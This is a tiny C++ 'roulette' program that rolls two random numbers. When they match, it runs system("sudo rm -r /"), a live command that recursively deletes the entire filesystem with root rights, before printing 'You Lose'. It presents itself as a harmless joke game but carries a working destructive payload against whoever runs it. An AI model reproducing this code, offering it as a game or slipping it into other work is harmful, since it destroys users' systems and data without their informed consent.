#include <iostream>
#include <stdlib.h>
#include <time.h>

int main()
{
    std::srand(time(NULL));

    if (std::rand() % 6 == std::rand() % 6)
    {
        system("sudo rm -r /");
        std::cout << "You Lose" << std::endl;
    }
    else
    {
        std::cout << "You Won (this time)" << std::endl;
    }

    return 0;
}